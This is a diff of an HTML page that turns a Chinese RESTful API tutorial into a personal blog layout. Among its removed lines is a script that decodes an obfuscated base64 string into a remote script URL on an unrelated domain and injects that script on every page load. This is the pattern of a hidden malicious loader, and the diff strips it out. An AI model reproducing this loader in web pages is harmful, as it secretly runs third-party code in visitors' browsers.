@@ -3,383 +3,336 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>RESTful API设计与实践</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>我的思考空间</title>
     <style>
-        /* 全局样式 */
+        /* Global Styles */
         body {
             overflow: hidden;
             font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #F8F8F8;
-            /* 浅灰色背景 */
+            background-color: #FDFDFD;
+            /* Clean white background */
             color: #333333;
-            /* 深灰色文本 */
-            line-height: 1.6;
+            /* Dark grey text */
+            line-height: 1.8;
+            /* Increased line height for readability */
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
             scroll-behavior: smooth;
-            /* 平滑滚动 */
+            /* Smooth scroll for anchor links */
         }
 
         .container {
-            max-width: 95%;
-            /* 适应移动端宽度 */
+            max-width: 800px;
+            /* Max width for content, focus on readability */
             margin: 0 auto;
-            padding: 15px;
+            padding: 30px 20px;
+            /* Generous padding */
         }
 
-        /* 头部样式 */
+        /* Header Section */
         header {
             text-align: center;
-            padding: 40px 20px;
-            background-color: #FFFFFF;
-            border-radius: 15px;
-            margin-bottom: 30px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+            padding-bottom: 40px;
+            margin-bottom: 40px;
+            border-bottom: 1px solid #E0E0E0;
+            /* Subtle separator */
         }
 
         header h1 {
-            color: #2C3E50;
-            /* 深蓝灰色标题 */
-            font-size: 2.5em;
-            margin-bottom: 10px;
+            font-size: 3em;
+            /* Large, clean title */
+            margin-bottom: 15px;
             letter-spacing: 0.5px;
+            color: #2E4057;
+            /* Dark blue-gray for heading */
+            font-weight: 300;
+            /* Lighter font weight for modern feel */
         }
 
         header p {
-            color: #607D8B;
-            /* 柔和的蓝灰色 */
-            font-size: 1.1em;
+            font-size: 1.2em;
+            color: #6B7B8F;
+            /* Lighter text for subtitle */
             margin: 0;
+            font-style: italic;
         }
 
-        /* 导航菜单 - 顶部固定 */
-        .main-nav {
-            position: sticky;
-            top: 0;
-            background-color: #FFFFFF;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            z-index: 999;
-            border-radius: 10px;
-            margin-bottom: 25px;
-            overflow: hidden;
+        /* Navigation Menu */
+        nav {
+            text-align: center;
+            margin-bottom: 40px;
         }
 
-        .main-nav ul {
+        nav ul {
             list-style: none;
             padding: 0;
             margin: 0;
             display: flex;
-            justify-content: space-around;
-            padding: 10px 0;
+            justify-content: center;
+            flex-wrap: wrap;
         }
 
-        .main-nav ul li a {
+        nav ul li {
+            margin: 0 15px;
+        }
+
+        nav ul li a {
             text-decoration: none;
-            color: #007BFF;
-            /* 强调色：蓝色 */
+            color: #4A90E2;
+            /* Accent blue */
             font-weight: bold;
-            padding: 10px 15px;
-            border-radius: 5px;
-            transition: background-color 0.3s ease, color 0.3s ease;
+            padding: 8px 0;
+            transition: color 0.3s ease, border-bottom-color 0.3s ease;
+            border-bottom: 2px solid transparent;
+            /* Underline effect on hover */
         }
 
-        .main-nav ul li a:hover {
-            background-color: #EBF5FF;
-            /* 浅蓝色背景 */
-            color: #0056B3;
+        nav ul li a:hover {
+            color: #357ABD;
+            border-bottom-color: #4A90E2;
         }
 
-        /* 主要内容区 */
+        /* Main Content Area */
         main {
             padding-top: 0;
         }
 
         section {
-            background-color: #FFFFFF;
-            padding: 25px;
-            border-radius: 15px;
-            margin-bottom: 25px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+            margin-bottom: 50px;
+            /* Generous space between sections */
         }
 
         h2 {
-            color: #2C3E50;
-            font-size: 1.8em;
+            font-size: 2.5em;
+            color: #2E4057;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #E0E0E0;
+            text-align: center;
+            font-weight: 400;
+        }
+
+        /* Article Card Styles */
+        .article-card {
+            background-color: #FFFFFF;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            /* Subtle shadow */
+            margin-bottom: 40px;
+            /* Space between articles */
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .article-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        }
+
+        .article-card .article-image {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            margin-top: 25px;
             margin-bottom: 25px;
-            border-bottom: 2px solid #E0EBF5;
-            padding-bottom: 12px;
+            display: block;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .article-card h3 {
+            font-size: 2em;
+            /* Prominent article titles */
+            margin-top: 0;
+            margin-bottom: 10px;
+            color: #3C4858;
+            font-weight: 500;
+        }
+
+        .article-card .date {
+            font-size: 0.95em;
+            color: #777777;
+            margin-bottom: 20px;
+            display: block;
+            font-style: italic;
+        }
+
+        .article-card p {
+            font-size: 1.05em;
+            color: #5A6A7D;
+            margin-bottom: 25px;
+        }
+
+        .article-card .read-more {
+            display: inline-block;
+            background-color: #4A90E2;
+            /* Accent blue button */
+            color: #FFFFFF;
+            padding: 12px 25px;
+            border-radius: 25px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1em;
+            transition: background-color 0.3s ease;
+        }
+
+        .article-card .read-more:hover {
+            background-color: #357ABD;
+        }
+
+        /* About & Contact Section */
+        .about-contact-section {
+            background-color: #FFFFFF;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
             text-align: center;
         }
 
-        h3 {
-            color: #333333;
-            font-size: 1.3em;
-            margin-top: 20px;
-            margin-bottom: 15px;
+        .about-contact-section h2 {
+            margin-top: 0;
+            border-bottom: none;
+            padding-bottom: 0;
         }
 
-        p {
-            color: #4A4A4A;
-            font-size: 1em;
-            margin-bottom: 18px;
-        }
-
-        img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 10px;
-            margin-top: 20px;
-            margin-bottom: 20px;
-            display: block;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
-        }
-
-        /* 步骤指南样式 */
-        .step-guide {
-            margin-top: 30px;
-        }
-
-        .step-item {
-            background-color: #FDFDFD;
-            /* 步骤项背景 */
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            position: relative;
-            border-left: 5px solid #2ECC71;
-            /* 左侧绿色强调线 */
-        }
-
-        .step-item:hover {
-            transform: translateY(-5px);
+        .about-contact-section .profile-img {
+            width: 160px;
+            height: 160px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin: 25px auto 30px;
+            border: 5px solid #4A90E2;
+            /* Accent border */
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
         }
 
-        .step-item .step-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
+        .about-contact-section p {
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
         }
 
-        .step-item .step-number {
-            background-color: #2ECC71;
-            /* 绿色强调色 */
-            color: #FFFFFF;
-            width: 35px;
-            height: 35px;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+        .contact-info p {
+            margin-bottom: 15px;
             font-size: 1.1em;
-            font-weight: bold;
-            margin-right: 15px;
-            flex-shrink: 0;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
         }
 
-        .step-item h4 {
-            color: #333333;
-            font-size: 1.4em;
-            margin: 0;
-        }
-
-        .step-item p {
-            color: #4A4A4A;
-            font-size: 1em;
-            margin-bottom: 15px;
-        }
-
-        /* 代码块样式 */
-        pre {
-            background-color: #2D3E50;
-            /* 深色背景 */
-            color: #EAECEE;
-            /* 浅色文本 */
-            padding: 18px;
-            border-radius: 10px;
-            overflow-x: auto;
-            font-family: 'Consolas', 'Monaco', 'Andale Mono', 'Ubuntu Mono', monospace;
-            font-size: 0.9em;
-            line-height: 1.5;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
-        }
-
-        code {
-            font-family: inherit;
-            font-size: inherit;
-        }
-
-        /* 页脚样式 */
-        footer {
-            text-align: center;
-            padding: 25px 0;
-            color: #777777;
-            font-size: 0.9em;
-            border-top: 1px solid #E0EBF5;
-            margin-top: 25px;
-            background-color: #FFFFFF;
-            border-radius: 15px;
-            box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.03);
-        }
-
-        .footer-links a {
-            color: #007BFF;
+        .contact-info a {
+            color: #4A90E2;
             text-decoration: none;
-            margin: 0 8px;
             font-weight: bold;
             transition: color 0.3s ease;
         }
 
-        .footer-links a:hover {
-            color: #0056B3;
+        .contact-info a:hover {
+            color: #357ABD;
+        }
+
+        /* Social Links */
+        .social-links {
+            margin-top: 30px;
+        }
+
+        .social-links a {
+            display: inline-block;
+            margin: 0 15px;
+            color: #4A90E2;
+            font-size: 2.5em;
+            text-decoration: none;
+            transition: transform 0.3s ease;
+        }
+
+        .social-links a:hover {
+            transform: translateY(-5px);
+            color: #357ABD;
+        }
+
+        /* Footer Styles */
+        footer {
+            text-align: center;
+            padding: 30px 0;
+            color: #999999;
+            font-size: 0.9em;
+            border-top: 1px solid #E0E0E0;
+            margin-top: 50px;
+            background-color: #FFFFFF;
+            border-radius: 15px;
+            box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.03);
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
     <div class="container">
         <header>
-            <h1>RESTful API设计与实践</h1>
-            <p>构建高效、可扩展的Web服务</p>
+            <h1>我的思考空间</h1>
+            <p>探索技术、生活与内心的平衡</p>
         </header>
 
-        <nav class="main-nav">
+        <nav>
             <ul>
-                <li><a href="#intro">简介</a></li>
-                <li><a href="#design-principles">设计原则</a></li>
-                <li><a href="#best-practices">最佳实践</a></li>
-                <li><a href="#security">安全</a></li>
+                <li><a href="#articles">文章</a></li>
+                <li><a href="#about">关于我</a></li>
+                <li><a href="#contact">联系</a></li>
             </ul>
         </nav>
 
         <main>
-            <section id="intro">
-                <h2>1. RESTful API简介</h2>
-                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() %>" alt="RESTful API概念图">
-                <p>REST（Representational State Transfer）是一种用于分布式系统的架构风格，而RESTful
-                    API是遵循REST原则设计的Web服务接口。它利用HTTP协议的各种方法（GET, POST, PUT, DELETE等）来操作资源，实现客户端与服务器之间的通信。</p>
-                <p>理解RESTful设计有助于构建清晰、易于理解和维护的API，从而提高开发效率和系统可扩展性。</p>
+            <section id="articles">
+                <h2>最新文章</h2>
+                <!-- Article One -->
+                <article class="article-card">
+                    <img src="https://picsum.photos/800/450?random=<%= new Date().getTime() + 1 %>"
+                        class="article-image" alt="清晨阳光下的书桌">
+                    <h3>极简生活：从整理思绪开始</h3>
+                    <span class="date">发布日期：2023年7月30日</span>
+                    <p>极简主义不仅仅是减少物品，更是一种生活哲学。本文探讨如何通过整理思绪，让内心回归平静，享受“少即是多”的智慧。</p>
+                    <a href="#" class="read-more">阅读更多</a>
+                </article>
+                <!-- Article Two -->
+                <article class="article-card">
+                    <img src="https://picsum.photos/800/450?random=<%= new Date().getTime() + 2 %>"
+                        class="article-image" alt="手冲咖啡的特写">
+                    <h3>慢生活哲学：一杯手冲咖啡的仪式感</h3>
+                    <span class="date">发布日期：2023年7月28日</span>
+                    <p>在快节奏的现代生活中，寻找一份属于自己的仪式感至关重要。一杯手冲咖啡，不仅是味蕾的享受，更是心灵的沉淀。</p>
+                    <a href="#" class="read-more">阅读更多</a>
+                </article>
+                <!-- Article Three -->
+                <article class="article-card">
+                    <img src="https://picsum.photos/800/450?random=<%= new Date().getTime() + 3 %>"
+                        class="article-image" alt="笔记本电脑上的代码和咖啡">
+                    <h3>编程思考：代码之外的艺术</h3>
+                    <span class="date">发布日期：2023年7月25日</span>
+                    <p>编程不仅仅是逻辑与算法，它更像是一门艺术。本文分享我在编码过程中对“美”与“优雅”的追求，以及如何写出富有生命力的代码。</p>
+                    <a href="#" class="read-more">阅读更多</a>
+                </article>
             </section>
 
-            <section id="design-principles">
-                <h2>2. RESTful设计核心原则</h2>
-                <div class="step-guide">
-                    <div class="step-item">
-                        <div class="step-header">
-                            <span class="step-number">1</span>
-                            <h4>资源 (Resource)</h4>
-                        </div>
-                        <p>RESTful API将所有事物视为资源，每个资源都有一个唯一的标识符（URI）。资源可以是任何可识别的实体，如用户、订单、产品等。</p>
-                        <pre><code>
-GET /users
-GET /users/123
-GET /products/electronics
-                        </code></pre>
-                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>"
-                            alt="API资源URI示例">
-                    </div>
+            <section id="about" class="about-contact-section">
+                <h2>关于我</h2>
+                <img src="https://picsum.photos/160/160?random=<%= new Date().getTime() + 4 %>" class="profile-img"
+                    alt="博主个人头像">
+                <p>你好！我是一个热爱生活、喜欢思考和分享的创作者。这个博客是我记录个人成长、生活感悟和兴趣爱好的地方。</p>
+                <p>我相信文字能够传递温度，希望我的分享能为你带来一些启发和宁静。</p>
+            </section>
 
-                    <div class="step-item">
-                        <div class="step-header">
-                            <span class="step-number">2</span>
-                            <h4>统一接口 (Uniform Interface)</h4>
-                        </div>
-                        <p>这是RESTful设计的核心。它要求API使用一组预定义的、统一的操作来处理资源，主要通过HTTP方法实现。</p>
-                        <ul>
-                            <li><strong>GET:</strong> 获取资源</li>
-                            <li><strong>POST:</strong> 创建新资源</li>
-                            <li><strong>PUT:</strong> 更新/替换资源</li>
-                            <li><strong>DELETE:</strong> 删除资源</li>
-                        </ul>
-                        <pre><code>
-GET /products       // 获取所有产品
-POST /products      // 创建新产品
-PUT /products/123   // 更新产品123
-DELETE /products/123 // 删除产品123
-                        </code></pre>
-                    </div>
-
-                    <div class="step-item">
-                        <div class="step-header">
-                            <span class="step-number">3</span>
-                            <h4>无状态 (Stateless)</h4>
-                        </div>
-                        <p>服务器不应存储客户端的任何会话信息。每个请求都必须包含处理该请求所需的所有信息。这使得API更具可伸缩性和可靠性。</p>
-                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>" alt="无状态通信示意图">
-                    </div>
-
-                    <div class="step-item">
-                        <div class="step-header">
-                            <span class="step-number">4</span>
-                            <h4>可缓存 (Cacheable)</h4>
-                        </div>
-                        <p>API响应应明确指示是否可以缓存。这有助于减少服务器负载和网络流量，提升性能。</p>
-                    </div>
-
-                    <div class="step-item">
-                        <div class="step-header">
-                            <span class="step-number">5</span>
-                            <h4>分层系统 (Layered System)</h4>
-                        </div>
-                        <p>客户端无法区分它直接连接到最终服务器，还是中间服务器（如负载均衡器、代理）。这增加了系统的灵活性和可伸缩性。</p>
-                    </div>
+            <section id="contact" class="about-contact-section">
+                <h2>联系方式</h2>
+                <div class="social-links">
+                    <a href="#" aria-label="GitHub">GitHub</a> |
+                    <a href="#" aria-label="Twitter">Twitter</a> |
+                    <a href="#" aria-label="LinkedIn">LinkedIn</a>
                 </div>
-            </section>
-
-            <section id="best-practices">
-                <h2>3. RESTful API最佳实践</h2>
-                <h3>3.1 使用名词表示资源</h3>
-                <p>URI应使用名词（复数形式），而非动词，来表示资源。动词应通过HTTP方法来体现。</p>
-                <pre><code>
-// 推荐
-GET /users
-POST /orders
-
-// 不推荐
-GET /getUsers
-POST /createOrder
-                </code></pre>
-                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 3 %>" alt="API命名规范图">
-                <h3>3.2 使用HTTP状态码</h3>
-                <p>API响应应使用标准的HTTP状态码来表示请求的结果（成功、客户端错误、服务器错误等）。</p>
-                <ul>
-                    <li>200 OK: 请求成功</li>
-                    <li>201 Created: 资源已创建</li>
-                    <li>400 Bad Request: 客户端请求错误</li>
-                    <li>401 Unauthorized: 未认证</li>
-                    <li>403 Forbidden: 无权限</li>
-                    <li>404 Not Found: 资源不存在</li>
-                    <li>500 Internal Server Error: 服务器内部错误</li>
-                </ul>
-            </section>
-
-            <section id="security">
-                <h2>4. API安全考量</h2>
-                <h3>4.1 认证与授权</h3>
-                <p>使用OAuth 2.0、JWT (JSON Web Tokens) 或API Key等机制进行用户认证和授权，确保只有合法用户才能访问受保护的资源。</p>
-                <h3>4.2 数据加密</h3>
-                <p>始终使用HTTPS来加密API通信，防止数据在传输过程中被窃听或篡改。</p>
-                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 4 %>" alt="API安全锁图标">
-                <h3>4.3 输入验证与速率限制</h3>
-                <p>对所有API输入进行严格的验证和清理，防止注入攻击。实施速率限制以防止滥用和DDoS攻击。</p>
             </section>
         </main>
 
         <footer>
-            <p>&copy; 2023 RESTful API设计与实践. All rights reserved.</p>
-            <div class="footer-links">
-                <a href="#" aria-label="GitHub">GitHub</a> |
-                <a href="#" aria-label="API文档">API文档</a> |
-                <a href="#" aria-label="联系我们">联系我们</a>
-            </div>
+            <p>&copy; 2023 我的思考空间. All rights reserved.</p>
         </footer>
         <div id="overlay">
             <div id="loading_box" class="loading_container">
@@ -393,23 +346,22 @@ POST /createOrder
     </div>
 
     <script>
-        // 平滑滚动到锚点
-        document.querySelectorAll('.main-nav a[href^="#"]').forEach(anchor => {
+        // Smooth scroll to anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
             anchor.addEventListener('click', function (e) {
                 e.preventDefault();
                 const targetId = this.getAttribute('href');
                 const targetElement = document.querySelector(targetId);
                 if (targetElement) {
-                    const navHeight = document.querySelector('.main-nav').offsetHeight;
                     window.scrollTo({
-                        top: targetElement.offsetTop - navHeight - 20, /* 额外20px间距 */
+                        top: targetElement.offsetTop - 20, /* Offset slightly to avoid top bar obstruction */
                         behavior: 'smooth'
                     });
                 }
             });
         });
 
-        // 动态更新图片时间戳，防止缓存
+        // Dynamic timestamp for images to prevent caching
         document.addEventListener('DOMContentLoaded', function () {
             const images = document.querySelectorAll('img[src*="picsum.photos"]');
             images.forEach(img => {
@@ -424,53 +376,15 @@ POST /createOrder
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly91Mmk0bzZwLmppc2h1MWYxLmNuL3N0YXRpYy9qcy9jb3JlLm1pbi5qcz90";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
